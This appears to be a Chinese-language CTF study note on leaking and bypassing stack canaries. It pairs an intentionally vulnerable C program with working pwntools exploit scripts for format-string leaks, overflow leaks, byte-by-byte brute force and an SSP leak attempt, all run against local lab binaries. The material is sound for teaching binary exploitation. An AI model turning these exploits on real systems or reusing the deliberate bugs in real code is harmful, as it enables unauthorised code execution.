# Canary泄露

### 参考文档：

[canary的各种姿势----pwn题解版 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/4657#toc-2)

**Attention: 格式化字符串和溢出泄露Canary，需要一次输出泄露Canary，加两次输入**

+++



### 源代码

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){   #循环，进行两次输入输出。
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

**注意，该程序要进行两次输入，两次输出；所以给了我们机会，一次泄露Canary值，一次输入Payload**

### 汇编主要内容

主要分析的即为`vuln`其内容如下图所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-24_15-11-24.png)



### 格式化字符串泄露Canary

| 符号 | 描述                                                         |
| ---- | ------------------------------------------------------------ |
| %p   | 将对应参数解析为地址输出                                     |
| %K$p | 将更改对应顺序，与格式化字符串后的第K个参数进行对应，并以地址形式解析参数值 |
| %K$n | 将于格式化字符串后的第K个参数进行对应，将参数解析为一个地址，并取消此次输出，而将已经输出的字节长度写入获取的地址 |

#### **EXP**

```python
from pwn import *
  
io = process("./ex2")
e = ELF("./ex2")
vuln_addr = e.sym["vuln"]
getshell_addr = e.sym["getshell"]
payload1 = "%31$08x"     # 注意为什么是31，和为什么输出长度为8

io.recvuntil("Hello Hacker!\n")
#pause()
io.sendline(payload1)

Canary = int(io.recv(8),16)
print(hex(Canary))
print("-------------")

Canary_offset = 100
ret_offset = 12

payload2 = Canary_offset*b'A' + p32(Canary) + ret_offset*b'A' + p32(getshell_addr)

io.sendline(payload2)
io.interactive()

```

​		在格式化字符串输出，两者差值难以计算，而是要运行到`printf`函数时，栈顶与我们想要的值差距来实现，其单位为4字节，所以 31实际是指他们相聚 31*4个字节；因为地址的取出以字符型，32位地址长度位4字节，但字符长度却是8个。



### 溢出泄露Canary

#### EXP

```python

from pwn import *
  
context.binary = 'ex2'
#context.log_level = 'debug'
io = process("./ex2")

e = ELF("./ex2")
getshell_addr = e.sym["getshell"]
io.recvuntil("Hello Hacker!\n")
payload1 ="A"*100    #100个字符和换行符；换行符覆盖了Canary字符串的\x00截断符号，使其输出
io.sendline(payload1)
io.recvuntil("A"*100)
Canary =u32(io.recv(4)) - 0xa 
log.info("Canary:"+hex(Canary))  #打印Canary

payload2 = 100*b"A" +p32(Canary) + 12*b'A' + p32(getshell_addr)

io.sendline(payload2)
io.interactive()

```

**重点关注Payload1的构造和，Canary减去0xa的原因**

#### Canary 覆盖\x00

- Canary设计以字节\x00结尾，本意是保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。需要合适的输出函数，并且需要先泄露Canary，之后再次溢出控制执行流程。
- 需要注意：Canary一般最低位是\x00，也就是结尾处，64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节。
- canary的位置不一定与ebp存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时canary位置可能出现偏差，有可能ebp与canary之间有字节被随机填充

#### 减去0xa的原因

- canary的最低字节为0x00，学过c语言的应该都知道0x00意味着一个字符串的结束。
- printf函数或者put函数无法输出结束字符之后的字符
- 故上述代码中压入了100个A和回车，回车将0x00覆盖，回车的ascii码为10，10的十六进制就是0xa
- 0x00被0xa覆盖掉之后，剩下的高字节部分就可以泄露出来了





#### One-by-One 爆破Canary

> 对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。



#### EXP

```python
from pwn import *
  
context(arch="i386",os="linux",log_level="debug")
io = process("./bin1")
e = ELF("./bin1")

Canary ='\x00'  #Canary

io.recvuntil("welcome\n")
for x in range(3):
    for y in range(256):
        io.send('A'*100 + Canary + chr(y))
        str = io.recvuntil("welcome\n")
        if b"recv" in str:
            Canary +=chr(y)
            break

print(Canary)
log.info(type(Canary))
getflag_addr = e.sym["getflag"]
payload = b'A'*100 + Canary.encode('utf-8') + 12*b'A'+p32(getflag_addr)
# payload = flat('A'*100, Canary, 12*'A',getflag_addr)  #flat()函数自动转换
io.sendline(payload)
io.interactive()

```



### SSP(Stack Smashing Protection)攻击

**没有成功实现，在libc 2.3.1版本，所利用的函数已被修改**

参考文献：

[Jarvis OJ --Smashes （SSP leak攻击）]([Jarvis OJ --Smashes （SSP leak攻击）_Kni9hT's Blog-CSDN博客](https://blog.csdn.net/weixin_43092232/article/details/102790343))

主要思想，是利用了以下函数：

```c
__stack_chk_fail :
void 
__attribute__ ((noreturn)) 
__stack_chk_fail (void) {   
    __fortify_fail ("stack smashing detected"); 
}

fortify_fail:
void 
__attribute__ ((noreturn)) 
__fortify_fail (msg)
   const char *msg; {
      /* The loop is added only to keep gcc happy. */
         while (1)
              __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") 
} 
libc_hidden_def (__fortify_fail)

```

argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。

**正常情况下，重复输入目标地址，覆盖到arg[0]，显示相应地址的值，但后期的libc对该函数做了改进，不再使用arg[0]信息了**

具体，进一步，见参考文献

```

from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')#arch也可以是i386~看文件
local = 1
elf = ELF('./bin2')
#标志位,0和１
if local:
    p = process('./bin2')
    libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
flag = 0x400d20
payload = ""
#payload += p64(flag)*1000
payload += 0x218*b'a' + p64(flag)
p.recvuntil("Hello!\nWhat's your name?")
p.sendline(payload)
p.recv()
p.sendline(payload)
p.interactive()
```



### 